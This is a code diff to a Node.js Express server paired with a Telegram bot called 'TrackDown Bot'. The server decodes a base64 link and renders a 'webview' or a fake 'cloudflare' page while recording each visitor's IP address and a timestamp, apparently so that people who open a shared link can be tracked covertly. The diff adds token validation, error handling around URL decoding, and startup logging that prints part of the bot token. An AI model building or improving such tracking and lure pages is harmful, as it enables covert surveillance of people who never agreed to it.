@@ -8,6 +8,13 @@ const TelegramBot = require('node-telegram-bot-api');
 
 // Use environment variable for bot token if available, otherwise use config
 const botToken = process.env.BOT_TOKEN || config.botToken;
+
+// Validate bot token
+if (!botToken || botToken === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
+  console.error('❌ Invalid bot token! Please set BOT_TOKEN environment variable.');
+  process.exit(1);
+}
+
 const bot = new TelegramBot(botToken, {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
@@ -31,7 +38,13 @@ d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
   
 if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+try {
+  const decodedUrl = atob(req.params.uri);
+  res.render("webview",{ip:ip,time:d,url:decodedUrl,uid:req.params.path,a:hostURL,t:use1pt});
+} catch (error) {
+  console.log("Invalid URI parameter:", req.params.uri);
+  res.redirect("https://t.me/th30neand0nly0ne");
+}
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -50,7 +63,13 @@ if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split("
   
 
 if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+try {
+  const decodedUrl = atob(req.params.uri);
+  res.render("cloudflare",{ip:ip,time:d,url:decodedUrl,uid:req.params.path,a:hostURL,t:use1pt});
+} catch (error) {
+  console.log("Invalid URI parameter:", req.params.uri);
+  res.redirect("https://t.me/th30neand0nly0ne");
+}
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -251,5 +270,8 @@ res.send("Done");
 
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
-console.log(`App Running on Port ${PORT}!`);
+console.log(`🚀 TrackDown Bot is running on port ${PORT}!`);
+console.log(`🌐 Web server: http://localhost:${PORT}`);
+console.log(`🤖 Bot token: ${botToken.substring(0, 10)}...`);
+console.log(`📱 Host URL: ${hostURL}`);
 });
